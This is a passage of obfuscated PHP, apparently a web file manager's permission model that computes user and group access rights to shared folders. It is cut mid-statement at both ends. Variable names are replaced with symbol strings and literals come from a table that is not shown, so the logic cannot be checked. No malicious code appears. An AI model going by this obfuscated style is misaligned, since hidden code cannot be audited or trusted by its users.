$¯Ã–É¸Ò = 0; if ($óÑ°ãçç[$Å⁄ãåßé[420]] == SourceModel::TYPE_GROUP) { $¯Ã–É¸Ò = $ÒŸåÄØﬁ * 2; } if ($óÑ°ãçç[$Å⁄ãåßé[420]] == SourceModel::TYPE_USER) { $¯Ã–É¸Ò = $ÒŸåÄØﬁ; } if ($óÑ°ãçç[$Å⁄ãåßé[420]] == SourceModel::TYPE_USER && $óÑ°ãçç[$Å⁄ãåßé[514]] == $Å⁄ãåßé[207]) { $¯Ã–É¸Ò = 0; } $ﬂπÊßë∞[] = $Æ‘‹Ü∂Ã[$Å⁄ãåßé[422]] + $¯Ã–É¸Ò; } array_multisort($ﬂπÊßë∞, SORT_DESC, $øúÊﬂÖ¿); return $øúÊﬂÖ¿; } public function getAllChildrenByUser($∫ƒ¨√„à, $≥›•Ûƒå) { $ô∑Ü¥’Ú =& $_SERVER[Á≈ ä ∞]; $∫≠òÆﬁŒ = Model($ô∑Ü¥’Ú[544])->getInfo($≥›•Ûƒå); if (!$≥›•Ûƒå || !$∫ƒ¨√„à || !$∫≠òÆﬁŒ) { return array(); } $ø∏°Â◊û = Model($ô∑Ü¥’Ú[1330])->sourceInfo($∫ƒ¨√„à); $¿…“ï†‹ = array(); $≥ä˚ÉáÊ = 1; if ($ø∏°Â◊û[$ô∑Ü¥’Ú[441]] == $ô∑Ü¥’Ú[207] && $ø∏°Â◊û[$ô∑Ü¥’Ú[514]] != $≥ä˚ÉáÊ && $this->groupContainUser($ø∏°Â◊û[$ô∑Ü¥’Ú[514]], $≥›•Ûƒå)) { foreach ($∫≠òÆﬁŒ[$ô∑Ü¥’Ú[2013]] as $äÿ•ÎœΩ) { $î¥Ü»µ© = Model($ô∑Ü¥’Ú[531])->getInfo($äÿ•ÎœΩ[$ô∑Ü¥’Ú[1830]]); $ÎÊÑ˚†ˆ = Model($ô∑Ü¥’Ú[544])->getInfoSimpleOuter($≥›•Ûƒå); $ÎÊÑ˚†ˆ[$ô∑Ü¥’Ú[476]] = $äÿ•ÎœΩ[$ô∑Ü¥’Ú[422]]; if (Model($ô∑Ü¥’Ú[516])->authCheckAction($äÿ•ÎœΩ[$ô∑Ü¥’Ú[422]][$ô∑Ü¥’Ú[422]], $ô∑Ü¥’Ú[1851])) { continue; } $ˆÔáËëÅ = array($ô∑Ü¥’Ú[42] => $ô∑Ü¥’Ú[1606] . $î¥Ü»µ©[$ô∑Ü¥’Ú[42]], $ô∑Ü¥’Ú[411] => $î¥Ü»µ©[$ô∑Ü¥’Ú[96]][$ô∑Ü¥’Ú[411]], $ô∑Ü¥’Ú[94] => KodIO::make($î¥Ü»µ©[$ô∑Ü¥’Ú[96]][$ô∑Ü¥’Ú[411]]), $ô∑Ü¥’Ú[441] => $ô∑Ü¥’Ú[207], $ô∑Ü¥’Ú[420] => $ô∑Ü¥’Ú[524], $ô∑Ü¥’Ú[43] => $ô∑Ü¥’Ú[563], $ô∑Ü¥’Ú[528] => $î¥Ü»µ©[$ô∑Ü¥’Ú[535]], $ô∑Ü¥’Ú[1830] => $î¥Ü»µ©[$ô∑Ü¥’Ú[1830]], $ô∑Ü¥’Ú[532] => $î¥Ü»µ©[$ô∑Ü¥’Ú[441]], $ô∑Ü¥’Ú[2010] => array($ÎÊÑ˚†ˆ)); $¿…“ï†‹[$ˆÔáËëÅ[$ô∑Ü¥’Ú[411]]] = $ˆÔáËëÅ; } } $òπáß≥› = array(); $ÉëÙœ®Œ = $this->getAllChildren($∫ƒ¨√„à); foreach ($ÉëÙœ®Œ as $»Üﬂï˙Ã) { $›Á∞∆ú„ = !1; foreach ($»Üﬂï˙Ã[$ô∑Ü¥’Ú[2010]] as $ÅÑàÀ¶í) { if ($ÅÑàÀ¶í[$ô∑Ü¥’Ú[1658]]) { if ($ÅÑàÀ¶í[$ô∑Ü¥’Ú[1658]] == $≥›•Ûƒå) { $›Á∞∆ú„ = !0; break; } } if ($ÅÑàÀ¶í[$ô∑Ü¥’Ú[1830]]) { if ($this->groupContainUser($ÅÑàÀ¶í[$ô∑Ü¥’Ú[1830]], $≥›•Ûƒå)) { $›Á∞∆ú„ = !0; break; } } } if ($›Á∞∆ú„) { $òπáß≥›[] = $»Üﬂï˙Ã; } $¸˙•“˛◊ = $»Üﬂï˙Ã[$ô∑Ü¥’Ú[411]]; if (isset($¿…“ï†‹[$¸˙•“˛◊])) { $»Üﬂï˙Ã[$ô∑Ü¥’Ú[2010]][] = $¿…“ï†‹[$¸˙•“˛◊][0]; $¿…“ï†‹[$¸˙•“˛◊] = !1; } } $¿…“ï†‹ = array_filter(array_values($¿…“ï†‹)); $òπáß≥› = array_merge($¿…“ï†‹, $òπáß≥›); return $òπáß≥›; } public function setAllChildrenByUser($ÌÔ°€Û£, $ Òô´›÷, $ªﬂÎ≥‡æ) { $‡¨›É§∏ =& $_SERVER[Á≈ ä ∞]; $ÌπÚ®Üı = $this->getAllChildrenByUser($ÌÔ°€Û£, $ Òô´›÷); if (!$ªﬂÎ≥‡æ || !$ÌπÚ®Üı) { return !1; } foreach ($ÌπÚ®Üı as $ê„„ ’˜) { $ÖÌ¥â¨ë = array(); foreach ($ê„„ ’˜[$‡¨›É§∏[2010]] as $Ó∏ìÍ„Ì) { $€ÃæÎ≠ø = $Ó∏ìÍ„Ì[$‡¨›É§∏[476]]; $˛“ÏÁ˘µ = $Ó∏ìÍ„Ì[$‡¨›É§∏[1658]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ω∑•ô®í = $Ó∏ìÍ„Ì[$‡¨›É§∏[1658]] ? $Ó∏ìÍ„Ì[$‡¨›É§∏[1658]] : $Ó∏ìÍ„Ì[$‡¨›É§∏[1830]]; if ($Ó∏ìÍ„Ì[$‡¨›É§∏[1658]] && $Ó∏ìÍ„Ì[$‡¨›É§∏[1658]] == $ Òô´›÷) { continue; } $ÖÌ¥â¨ë[] = array($‡¨›É§∏[411] => $ê„„ ’˜[$‡¨›É§∏[411]], $‡¨›É§∏[420] => $˛“ÏÁ˘µ, $‡¨›É§∏[514] => intval($Ω∑•ô®í), $‡¨›É§∏[1934] => isset($€ÃæÎ≠ø[$‡¨›É§∏[408]]) ? intval($€ÃæÎ≠ø[$‡¨›É§∏[408]]) : 0, $‡¨›É§∏[1990] => isset($€ÃæÎ≠ø[$‡¨›É§∏[1990]]) ? intval($€ÃæÎ≠ø[$‡¨›É§∏[1990]]) : -1); } $ÖÌ¥â¨ë[] = array($‡¨›É§∏[411] => $ê„„ ’˜[$‡¨›É§∏[411]], $‡¨›É§∏[420] => SourceModel::TYPE_USER, $‡¨›É§∏[514] => intval($ Òô´›÷), $‡¨›É§∏[1934] => intval($ªﬂÎ≥‡æ), $‡¨›É§∏[1990] => -1); $this->where(array($‡¨›É§∏[426] => $ê„„ ’˜[$‡¨›É§∏[411]]))->delete(); $this->addAll($ÖÌ¥â¨ë); } return !0; } public function get($ôÁ“¨√ô) { $˘˛Ó‚™ì = $this->getSourceList(array($ôÁ“¨√ô), !0); return $˘˛Ó‚™ì[0]; } public function getSourceList($¡‡„èøî, $ôÛ≠—√‡ = false, $∏‡ÿÖå¯ = false) { $ùà€•ΩÁ =& $_SERVER[Á≈ ä ∞]; if (!$¡‡„èøî) { return array(); } $ÖÁ⁄ùµ† = Model($ùà€•ΩÁ[1330]); if (!$ôÛ≠—√‡ && count($¡‡„èøî) == 1) { $ôÛ≠—√‡ = array(); $ôÛ≠—√‡[$¡‡„èøî[0]] = $ÖÁ⁄ùµ†->sourceInfo($¡‡„èøî[0]); } if (!$ôÛ≠—√‡) { $≠Íñ’Ã± = array($ùà€•ΩÁ[426] => array($ùà€•ΩÁ[427], $¡‡„èøî)); $ôÛ≠—√‡ = $ÖÁ⁄ùµ†->field($ùà€•ΩÁ[2014])->where($≠Íñ’Ã±)->select(); $ôÛ≠—√‡ = array_to_keyvalue($ôÛ≠—√‡, $ùà€•ΩÁ[411]); } $å¨èñ•˙ = $¡‡„èøî; foreach ($ôÛ≠—√‡ as $…ÙÏí˚¶ => $ä¨‚¯‹ó) { $Ÿ∆Ä≈–¯ = $ÖÁ⁄ùµ†->parentLevelArray($ä¨‚¯‹ó[$ùà€•ΩÁ[530]]); $å¨èñ•˙ = array_merge($å¨èñ•˙, array($…ÙÏí˚¶), array_reverse($Ÿ∆Ä≈–¯)); } $å¨èñ•˙ = array_values(array_unique($å¨èñ•˙)); if (!$å¨èñ•˙) { return array(); } $—ÊëñûÂ = $this->sourceAuthSelect($å¨èñ•˙); $™ü˚›„ﬂ = array(); foreach ($å¨èñ•˙ as $°˙Å±¢ ) { if (isset($—ÊëñûÂ[$°˙Å±¢ ])) { $™ü˚›„ﬂ[$°˙Å±¢ ] = $—ÊëñûÂ[$°˙Å±¢ ]; } } $∏À¯µ˛ã = $this->userIsRoot($∏‡ÿÖå¯); $«≤Ì¥ ¯ = AuthModel::authAll(); $øºü⁄„¢ = array($ùà€•ΩÁ[423] => $«≤Ì¥ ¯, $ùà€•ΩÁ[2015] => array($ùà€•ΩÁ[428] => 0, $ùà€•ΩÁ[1836] => $«≤Ì¥ ¯, $ùà€•ΩÁ[429] => LNG($ùà€•ΩÁ[2016]), $ùà€•ΩÁ[1853] => $ùà€•ΩÁ[2017])); $¬ñèïÆé = array(); foreach ($ôÛ≠—√‡ as $°˙Å±¢  => $◊∑ÖÙÒ≈) { if ($∏À¯µ˛ã && $GLOBALS[$ùà€•ΩÁ[16]][$ùà€•ΩÁ[1849]]) { $¬ñèïÆé[$°˙Å±¢ ] = $øºü⁄„¢; continue; } $¬ñèïÆé[$°˙Å±¢ ] = $this->makeSourceAuth($◊∑ÖÙÒ≈, $™ü˚›„ﬂ, $∏‡ÿÖå¯); } return $¬ñèïÆé; } public function authDeepCheck($ÄØÜûú, $ıŒ Å£´ = false) { $«Ûß≈Ÿ =& $_SERVER[Á≈ ä ∞]; $ıŒ Å£´ = $ıŒ Å£´ ? $ıŒ Å£´ : USER_ID; $àæ˙Ö¡˛ = $this->makeAuthDeep($ıŒ Å£´); if (!in_array($ÄØÜûú, $àæ˙Ö¡˛[$«Ûß≈Ÿ[2018]])) { return !1; } $ÍÏ≤œº∆ = array(); foreach ($àæ˙Ö¡˛[$«Ûß≈Ÿ[2019]] as $ÈªêÍÊ => $˙åœª‹ı) { if (!in_array($ÄØÜûú, $˙åœª‹ı)) { continue; } $ÍÏ≤œº∆[] = $ÈªêÍÊ; } if (!$ÍÏ≤œº∆) { return !1; } $∏–Â€ÂÄ = $ÍÏ≤œº∆ ? $ÍÏ≤œº∆[0] : $ÄØÜûú; return array($«Ûß≈Ÿ[423] => -1, $«Ûß≈Ÿ[476] => array($«Ûß≈Ÿ[428] => $«Ûß≈Ÿ[1193], $«Ûß≈Ÿ[1836] => $«Ûß≈Ÿ[207], $«Ûß≈Ÿ[429] => LNG($«Ûß≈Ÿ[2020]), $«Ûß≈Ÿ[1853] => $«Ûß≈Ÿ[2021]), $«Ûß≈Ÿ[2022] => LNG($«Ûß≈Ÿ[2023]), $«Ûß≈Ÿ[2024] => $this->sourceAuthInfo($∏–Â€ÂÄ)); } protected function makeAuthDeep($á„‡÷„¶ = false) { $¿¥Ê¨ΩÙ =& $_SERVER[Á≈ ä ∞]; static $©à∏¸¸¨ = array(); $á„‡÷„¶ = $á„‡÷„¶ ? $á„‡÷„¶ : USER_ID; if (isset($©à∏¸¸¨[$á„‡÷„¶])) { return $©à∏¸¸¨[$á„‡÷„¶]; } $õêÕ¶“¸ = Model($¿¥Ê¨ΩÙ[2025])->listData(); $∞ª¿≈⁄Ù = array(); foreach ($õêÕ¶“¸ as $Á≥Úù€) { if ($Á≥Úù€[$¿¥Ê¨ΩÙ[422]] == 0 && $Á≥Úù€[$¿¥Ê¨ΩÙ[1852]] == $¿¥Ê¨ΩÙ[98]) { $∞ª¿≈⁄Ù[] = $Á≥Úù€[$¿¥Ê¨ΩÙ[408]]; } } $Ê“˜˝ãΩ = $this->userGroupParents($á„‡÷„¶); $µ≥˚”…¶ = array($¿¥Ê¨ΩÙ[420] => SourceModel::TYPE_USER, $¿¥Ê¨ΩÙ[514] => $á„‡÷„¶); if ($Ê“˜˝ãΩ) { $µ≥˚”…¶ = array(array($¿¥Ê¨ΩÙ[420] => SourceModel::TYPE_USER, $¿¥Ê¨ΩÙ[514] => $á„‡÷„¶), array($¿¥Ê¨ΩÙ[420] => SourceModel::TYPE_GROUP, $¿¥Ê¨ΩÙ[514] => array($¿¥Ê¨ΩÙ[427], $Ê“˜˝ãΩ)), $¿¥Ê¨ΩÙ[1003] => $¿¥Ê¨ΩÙ[1928]); } $«§ıÍæÖ = $this->field($¿¥Ê¨ΩÙ[2026])->where($µ≥˚”…¶)->select(); $÷ûìØßò = array(); $ÿü∏€Âê = array_to_keyvalue_group($«§ıÍæÖ, $¿¥Ê¨ΩÙ[411]); foreach ($ÿü∏€Âê as $›—†“µ¨ => $±øèŒÂ‚) { $†ŸÚ§Ñ› = $this->authArrayCheck($±øèŒÂ‚, $á„‡÷„¶); if ($†ŸÚ§Ñ›[$¿¥Ê¨ΩÙ[423]] > 0) { $÷ûìØßò[] = $›—†“µ¨ . $¿¥Ê¨ΩÙ[22]; } } if ($Ê“˜˝ãΩ) { $È’±ì∆Ô = Model($¿¥Ê¨ΩÙ[531]); foreach ($Ê“˜˝ãΩ as $ú˝€≈˙—) { $◊ﬁ÷¡áü = $È’±ì∆Ô->getInfo($ú˝€≈˙—); if (!$◊ﬁ÷¡áü || !is_array($◊ﬁ÷¡áü[$¿¥Ê¨ΩÙ[96]])) { continue; } $÷ûìØßò[] = $◊ﬁ÷¡áü[$¿¥Ê¨ΩÙ[96]][$¿¥Ê¨ΩÙ[411]]; } } $∏·˝éèÉ = array(); $Á‰“…≠‹ = $Ê“˜˝ãΩ; $˙ÎÃ‹¥Ç = Model($¿¥Ê¨ΩÙ[1330]); $È’±ì∆Ô = Model($¿¥Ê¨ΩÙ[531]); $ãì§ú‹Ç = array(); $Ëà”¬≠¢ = array(); $ôºÇ∆˝ﬁ = array(); $¯Ÿõ¡œÀ = array(); if ($÷ûìØßò) { $À¥¥è’∏ = $˙ÎÃ‹¥Ç->where(array($¿¥Ê¨ΩÙ[411] => array($¿¥Ê¨ΩÙ[427], $÷ûìØßò)))->select(); foreach ($À¥¥è’∏ as $ëÿÈè¡¡) { $’–åŒÑ˚ = $˙ÎÃ‹¥Ç->parentLevelArray($ëÿÈè¡¡[$¿¥Ê¨ΩÙ[530]]); $∏·˝éèÉ = array_merge($∏·˝éèÉ, $’–åŒÑ˚); $Á‰“…≠‹[] = $ëÿÈè¡¡[$¿¥Ê¨ΩÙ[514]]; $ãì§ú‹Ç[$ëÿÈè¡¡[$¿¥Ê¨ΩÙ[411]]] = $’–åŒÑ˚; $Ëà”¬≠¢[$ëÿÈè¡¡[$¿¥Ê¨ΩÙ[411]]] = $ëÿÈè¡¡[$¿¥Ê¨ΩÙ[514]]; } } $Á‰“…≠‹ = array_values(array_unique($Á‰“…≠‹)); $ﬁêÀ˝¢Ï = $Á‰“…≠‹; foreach ($ﬁêÀ˝¢Ï as $ú˝€≈˙—) { $◊ﬁ÷¡áü = $È’±ì∆Ô->getInfo($ú˝€≈˙—); $’–åŒÑ˚ = $˙ÎÃ‹¥Ç->parentLevelArray($◊ﬁ÷¡áü[$¿¥Ê¨ΩÙ[530]]); $Á‰“…≠‹ = array_merge($Á‰“…≠‹, $’–åŒÑ˚); } $Á‰“…≠‹ = array_values(array_unique($Á‰“…≠‹)); foreach ($Á‰“…≠‹ as $ú˝€≈˙—) { $◊ﬁ÷¡áü = $È’±ì∆Ô->getInfo($ú˝€≈˙—); $∏·˝éèÉ[] = $◊ﬁ÷¡áü[$¿¥Ê¨ΩÙ[96]][$¿¥Ê¨ΩÙ[411]]; $ôºÇ∆˝ﬁ[$ú˝€≈˙—] = $◊ﬁ÷¡áü[$¿¥Ê¨ΩÙ[96]][$¿¥Ê¨ΩÙ[411]]; $¯Ÿõ¡œÀ[$ú˝€≈˙—] = $˙ÎÃ‹¥Ç->parentLevelArray($◊ﬁ÷¡áü[$¿¥Ê¨ΩÙ[530]]); } foreach ($ãì§ú‹Ç as $ôá‰◊ãï => $œ„ÆÄ¬±) { $§©◊‡‹ó = $Ëà”¬≠¢[$ôá‰◊ãï]; if (!$§©◊‡‹ó || !$ôºÇ∆˝ﬁ[$§©◊‡‹ó]) { continue; } $œËí£√ä = array(); foreach ($¯Ÿõ¡œÀ[$§©◊‡‹ó] as $ú˝€≈˙—) { $œËí£√ä[] = $ôºÇ∆˝ﬁ[$ú˝€≈˙—]; } $ãì§ú‹Ç[$ôá‰◊ãï] = array_merge($œËí£√ä, $œ„ÆÄ¬±); } $∏·˝éèÉ = array_values(array_unique($∏·˝éèÉ)); $¨ôÌ†ÿÄ = array($¿¥Ê¨ΩÙ[2018] => $∏·˝éèÉ, $¿¥Ê¨ΩÙ[2019] => $ãì§ú‹Ç); $©à∏¸¸¨[$á„‡÷„¶] = $¨ôÌ†ÿÄ; return $¨ôÌ†ÿÄ; } private function makeSourceAuth($Ò·ÉÎ˙Ô, $Æ∏âå¿Ä, $ïÖúßîÉ = false) { $£–˝Ï ‰ =& $_SERVER[Á≈ ä ∞]; $†¥Ô¬‘Î = $£–˝Ï ‰[98]; $ó»Ω¡¢£ = $Ò·ÉÎ˙Ô[$£–˝Ï ‰[514]]; $˚ﬁ∞ÚêÄ = $Ò·ÉÎ˙Ô[$£–˝Ï ‰[420]] == SourceModel::TYPE_GROUP; $√ñﬂ“Ëº = $˚ﬁ∞ÚêÄ ? $this->groupRootAuth($ó»Ω¡¢£, $ïÖúßîÉ) : !1; if ($√ñﬂ“Ëº && Model($£–˝Ï ‰[516])->authCheckAction($√ñﬂ“Ëº[$£–˝Ï ‰[422]], $£–˝Ï ‰[1851])) { return $this->groupAuthInfo($√ñﬂ“Ëº, $ó»Ω¡¢£); } $ ‰⁄⁄∂∆ = Model($£–˝Ï ‰[1330])->parentLevelArray($Ò·ÉÎ˙Ô[$£–˝Ï ‰[530]]); $ ‰⁄⁄∂∆ = array_merge(array($Ò·ÉÎ˙Ô[$£–˝Ï ‰[411]]), array_reverse($ ‰⁄⁄∂∆)); $Ø ∞‡èÚ = !1; foreach ($ ‰⁄⁄∂∆ as $¶´¶¥ãÉ) { if (!isset($Æ∏âå¿Ä[$¶´¶¥ãÉ])) { continue; } $Ü†àå‘Ω = $this->authMake($Æ∏âå¿Ä[$¶´¶¥ãÉ], $ïÖúßîÉ); if ($Ü†àå‘Ω[$£–˝Ï ‰[476]]) { $Ø ∞‡èÚ = $Ü†àå‘Ω; break; } } if (!$˚ﬁ∞ÚêÄ) { return $Ø ∞‡èÚ; } if (!$Ø ∞‡èÚ && $√ñﬂ“Ëº) { $Ø ∞‡èÚ = $this->groupAuthInfo($√ñﬂ“Ëº, $ó»Ω¡¢£); } if (!$Ø ∞‡èÚ) { $¢Ñ¢””¿ = Model($£–˝Ï ‰[531])->getInfo($ó»Ω¡¢£); $æÉ˙ÎµÁ = explode($£–˝Ï ‰[60], trim($¢Ñ¢””¿[$£–˝Ï ‰[530]], $£–˝Ï ‰[60])); $æÉ˙ÎµÁ = array_reverse($æÉ˙ÎµÁ); foreach ($æÉ˙ÎµÁ as $÷¶∫®ó¿) { if ($÷¶∫®ó¿ == $£–˝Ï ‰[207] || $÷¶∫®ó¿ == $†¥Ô¬‘Î) { continue; } $â¶Ñ≠õß = $this->groupRootAuth($÷¶∫®ó¿, $ïÖúßîÉ); if (!$â¶Ñ≠õß) { continue; } $Ø ∞‡èÚ = $this->groupAuthInfo($â¶Ñ≠õß, $÷¶∫®ó¿); break; } } if (!$Ø ∞‡èÚ || $Ø ∞‡èÚ[$£–˝Ï ‰[423]] <= 0) { $èùö÷óˆ = $this->authDeepCheck($Ò·ÉÎ˙Ô[$£–˝Ï ‰[411]], $ïÖúßîÉ); if ($èùö÷óˆ) { $Ø ∞‡èÚ = $èùö÷óˆ; } } return $Ø ∞‡èÚ; } private function userIsRoot($ûÊÜ≠ß¶ = false) { $¸•‹ùÛÔ =& $_SERVER[Á≈ ä ∞]; if (!$ûÊÜ≠ß¶ && _get($GLOBALS, $¸•‹ùÛÔ[512])) { return !0; } $“¸Ù¢ó‰ = Model($¸•‹ùÛÔ[544])->getInfo($ûÊÜ≠ß¶); $Ø¸›û˜Õ = Model($¸•‹ùÛÔ[2027])->listData($“¸Ù¢ó‰[$¸•‹ùÛÔ[1537]]); if ($Ø¸›û˜Õ && $Ø¸›û˜Õ[$¸•‹ùÛÔ[520]][$¸•‹ùÛÔ[2028]] == 1) { return !0; } return !1; } private function sourceAuthInfo($òöÃ˝ü«) { $á¡¿√ù„ =& $_SERVER[Á≈ ä ∞]; $ÃûˆÔÕƒ = Model($á¡¿√ù„[1330]); $ÿ÷ª»≠— = $ÃûˆÔÕƒ->sourceInfo($òöÃ˝ü«); if (!$ÿ÷ª»≠—) { return !1; } $ÃûˆÔÕƒ->groupPathDisplay($ÿ÷ª»≠—); $¿ﬁ•ΩÇÒ = array($ÿ÷ª»≠—); $¿ﬁ•ΩÇÒ = $ÃûˆÔÕƒ->_listAppendPath($¿ﬁ•ΩÇÒ); $ÿ÷ª»≠— = $¿ﬁ•ΩÇÒ[0]; $¢Œ∆À¸≥ = $ÿ÷ª»≠—[$á¡¿√ù„[528]]; if (isset($ÿ÷ª»≠—[$á¡¿√ù„[536]])) { $Àä¡úÜ§ = explode($á¡¿√ù„[18], trim($ÿ÷ª»≠—[$á¡¿√ù„[528]], $á¡¿√ù„[18])); array_shift($Àä¡úÜ§); $¢Œ∆À¸≥ = $ÿ÷ª»≠—[$á¡¿√ù„[534]] . $á¡¿√ù„[2029] . implode($á¡¿√ù„[18], $Àä¡úÜ§); } return array($á¡¿√ù„[429] => $ÿ÷ª»≠—[$á¡¿√ù„[42]], $á¡¿√ù„[94] => KodIO::make($ÿ÷ª»≠—[$á¡¿√ù„[411]]), $á¡¿√ù„[2030] => $¢Œ∆À¸≥); } private function groupAuthInfo($˘‹‘¶Æ©, $≈π…Ó±ï) { $Ú≈∆ÛëÍ =& $_SERVER[Á≈ ä ∞]; $¢Õ›Ôéî = Model($Ú≈∆ÛëÍ[531])->getInfo($≈π…Ó±ï); return array($Ú≈∆ÛëÍ[2031] => intval($˘‹‘¶Æ©[$Ú≈∆ÛëÍ[422]]), $Ú≈∆ÛëÍ[2015] => $˘‹‘¶Æ©, $Ú≈∆ÛëÍ[2032] => LNG($Ú≈∆ÛëÍ[2033]), $Ú≈∆ÛëÍ[2024] => array($Ú≈∆ÛëÍ[429] => $¢Õ›Ôéî[$Ú≈∆ÛëÍ[42]], $Ú≈∆ÛëÍ[94] => KodIO::make($¢Õ›Ôéî[$Ú≈∆ÛëÍ[96]][$Ú≈∆ÛëÍ[411]]), $Ú≈∆ÛëÍ[2030] => $¢Õ›Ôéî[$Ú≈∆ÛëÍ[535]])); } protected function groupRootAuth($Ω˛Ä“£Ì, $±Ê≈åÃ® = false) { $ùﬂ¨‚ÿΩ =& $_SERVER[Á≈ ä ∞]; $±Ê≈åÃ® = $±Ê≈åÃ® ? $±Ê≈åÃ® : USER_ID; $çûü¬¸¬ = $±Ê≈åÃ® . $ùﬂ¨‚ÿΩ[2034] . $Ω˛Ä“£Ì; static $ÌÜæÔ¡ö = array(); if (isset($ÌÜæÔ¡ö[$çûü¬¸¬])) { return $ÌÜæÔ¡ö[$çûü¬¸¬]; } $Èì¯ÂËù = Model($ùﬂ¨‚ÿΩ[531])->getInfo($Ω˛Ä“£Ì); $â æ˘Ãﬂ = $this->userGroupList($±Ê≈åÃ®); $¨»∞¥Ö¡ = isset($â æ˘Ãﬂ[$Ω˛Ä“£Ì]) ? $â æ˘Ãﬂ[$Ω˛Ä“£Ì][$ùﬂ¨‚ÿΩ[422]] : !1; if ($¨»∞¥Ö¡ && Model($ùﬂ¨‚ÿΩ[516])->authCheckAction($¨»∞¥Ö¡[$ùﬂ¨‚ÿΩ[422]], $ùﬂ¨‚ÿΩ[1851])) { $ÌÜæÔ¡ö[$çûü¬¸¬] = $¨»∞¥Ö¡; return $¨»∞¥Ö¡; } $Ø¸ÅŸ≥∆ = $this->sourceAuthSelect($Èì¯ÂËù[$ùﬂ¨‚ÿΩ[96]][$ùﬂ¨‚ÿΩ[411]]); $í¯Úê˘Ã = $Ø¸ÅŸ≥∆ ? $this->authMake($Ø¸ÅŸ≥∆, $±Ê≈åÃ®) : !1; $∆∂…±ıÊ = $í¯Úê˘Ã ? $í¯Úê˘Ã[$ùﬂ¨‚ÿΩ[476]] : !1; $ÌÜæÔ¡ö[$çûü¬¸¬] = $∆∂…±ıÊ ? $∆∂…±ıÊ : $¨»∞¥Ö¡; return $ÌÜæÔ¡ö[$çûü¬¸¬]; } public function authOwnerApply($ÊŸ‹®ñ˝) { $Íû¿»Õ’ =& $_SERVER[Á≈ ä ∞]; if (empty($ÊŸ‹®ñ˝[$Íû¿»Õ’[422]]) || isset($ÊŸ‹®ñ˝[$Íû¿»Õ’[2035]]) && $ÊŸ‹®ñ˝[$Íû¿»Õ’[2035]]) { return $ÊŸ‹®ñ˝; } if (AuthModel::authCheckRoot($ÊŸ‹®ñ˝[$Íû¿»Õ’[422]][$Íû¿»Õ’[423]])) { return $ÊŸ‹®ñ˝; } $›øêñ»◊ = Model($Íû¿»Õ’[1330])->parentLevelArray($ÊŸ‹®ñ˝[$Íû¿»Õ’[530]]); $›øêñ»◊ = array_merge(array($ÊŸ‹®ñ˝[$Íû¿»Õ’[411]]), array_reverse($›øêñ»◊)); $˚Ö„Ñ≠ü = $this->sourceAuthSelect($›øêñ»◊); $°ç˛ü˜“ = array(); $¨óÀ¬ã≥ = array(); foreach ($˚Ö„Ñ≠ü as $æøä‡Àú => $¿‹îÖ≠Ë) { $”ç°‹√ê = $this->authFolderOwnerUser($¿‹îÖ≠Ë); $°ç˛ü˜“[$æøä‡Àú] = $”ç°‹√ê; $¨óÀ¬ã≥ = array_merge($¨óÀ¬ã≥, $”ç°‹√ê[$Íû¿»Õ’[609]]); if ($”ç°‹√ê[$Íû¿»Õ’[2036]]) { break; } } if (count($¨óÀ¬ã≥) == 0) { $¨óÀ¬ã≥ = $this->authFolderOwnerGroup($ÊŸ‹®ñ˝[$Íû¿»Õ’[514]]); } $¨óÀ¬ã≥ = array_unique($¨óÀ¬ã≥); if (AuthModel::authCheckRoot($ÊŸ‹®ñ˝[$Íû¿»Õ’[422]][$Íû¿»Õ’[423]])) { $¨óÀ¬ã≥[] = USER_ID; } $ÊŸ‹®ñ˝[$Íû¿»Õ’[422]][$Íû¿»Õ’[2037]] = Model($Íû¿»Õ’[522])->userListInfo($¨óÀ¬ã≥); return $ÊŸ‹®ñ˝; } private function authFolderOwnerGroup($ ü–’ì…) { $ëı‰å€À =& $_SERVER[Á≈ ä ∞]; $Åπ–§µ∑ = Model($ëı‰å€À[1920])->where(array($ëı‰å€À[1830] => $ ü–’ì…))->select(); $ìœé›ê≠ = array(); if (!$Åπ–§µ∑) { return $ìœé›ê≠; } foreach ($Åπ–§µ∑ as $≤∑ÔÛ‰Ω) { $Í∆ÚïØµ = $this->authInfo($≤∑ÔÛ‰Ω); if (AuthModel::authCheckRoot($Í∆ÚïØµ[$ëı‰å€À[422]])) { $ìœé›ê≠[] = $≤∑ÔÛ‰Ω[$ëı‰å€À[1658]]; } } return $ìœé›ê≠; } private function authFolderOwnerUser($ ÑêñÄ≥) { $ÜΩ∂à∑Œ =& $_SERVER[Á≈ ä ∞]; $ôëõ≤‚ = array(); $£¥ó˘ÀΩ = !1; foreach ($ ÑêñÄ≥ as $ÒËÁ•√í) { $£øÄºÿ = $this->authInfo($ÒËÁ•√í); if ($ÒËÁ•√í[$ÜΩ∂à∑Œ[514]] == $ÜΩ∂à∑Œ[207]) { $£¥ó˘ÀΩ = !0; } if ($ÒËÁ•√í[$ÜΩ∂à∑Œ[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($£øÄºÿ[$ÜΩ∂à∑Œ[422]])) { $ôëõ≤‚[] = $ÒËÁ•√í[$ÜΩ∂à∑Œ[514]]; } } } return array($ÜΩ∂à∑Œ[609] => $ôëõ≤‚, $ÜΩ∂à∑Œ[2036] => $£¥ó˘ÀΩ); } public function authMake($±ÌÍõÌê, $Ω“ñ√´Ï = false) { $Ì‰Òß◊â =& $_SERVER[Á≈ ä ∞]; $¯’©ÿõ¿ = $this->authArrayCheck($±ÌÍõÌê, $Ω“ñ√´Ï); if ($¯’©ÿõ¿[$Ì‰Òß◊â[2038]]) { $¯’©ÿõ¿[$Ì‰Òß◊â[2038]] = $this->sourceAuthInfo($¯’©ÿõ¿[$Ì‰Òß◊â[2038]]); } return $¯’©ÿõ¿; } public function authArrayCheck($—ßÆ·‰∏, $’Ã¯ûæÌ = false) { $ÊÃæƒ«ò =& $_SERVER[Á≈ ä ∞]; if (!$—ßÆ·‰∏) { return array($ÊÃæƒ«ò[423] => 0, $ÊÃæƒ«ò[476] => !1); } $’Ã¯ûæÌ = $’Ã¯ûæÌ ? $’Ã¯ûæÌ : USER_ID; $ÿ’ˆõ∏Ü = 0; $Ò‚‰¬ñ∫ = 0; $í¯•˘∫æ = 0; $÷˙ıç«è = 0; $Úú‰„üÒ = 0; $–ô¬‘π≈ = 0; $‘Ù˛Â™‰ = 1000; $® ¯ ¨£ = 0; $ÇÜ˝ø´• = 0; $ê˜≠®•ö = 0; $ºƒ¡Áçñ = 0; $òÌÜ˚∏Ü = array($ÊÃæƒ«ò[411] => 0); foreach ($—ßÆ·‰∏ as $òÌÜ˚∏Ü) { $˚øÊëæŒ = $this->authInfo($òÌÜ˚∏Ü); if 